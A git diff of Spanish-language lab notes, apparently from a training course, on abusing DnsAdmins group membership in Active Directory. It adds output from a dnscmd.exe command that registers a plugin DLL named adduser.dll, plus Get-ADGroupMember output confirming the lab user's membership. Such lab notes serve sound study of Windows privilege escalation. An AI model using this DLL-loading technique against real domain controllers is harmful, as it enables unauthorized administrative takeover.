@@ -90,6 +90,11 @@ Comando:
 
 ```cmd
 dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
+
+DNS Server failed to reset registry property.
+    Status = 5 (0x00000005)
+Command failed: ERROR_ACCESS_DENIED
+
 ```
 
 * Resultado esperado para usuario normal: `ERROR_ACCESS_DENIED` (Status = 5). El servicio DNS no permite que usuarios no miembros de `DnsAdmins` cambien esa configuración.
@@ -102,10 +107,19 @@ Comando PowerShell mostrado:
 
 ```powershell
 Get-ADGroupMember -Identity DnsAdmins
+
+
+distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+name              : netadm
+objectClass       : user
+objectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14
+SamAccountName    : netadm
+SID               : S-1-5-21-669053619-2741956077-1013132368-1109
 ```
 
 * `Get-ADGroupMember` lista miembros de un grupo de Active Directory.
 * Salida muestra atributos como `distinguishedName`, `name`, `SamAccountName`, `objectGUID`, `SID`.
+* En este caso vemos que nuestro usuario aparece entre los miembros
 
 ---
 
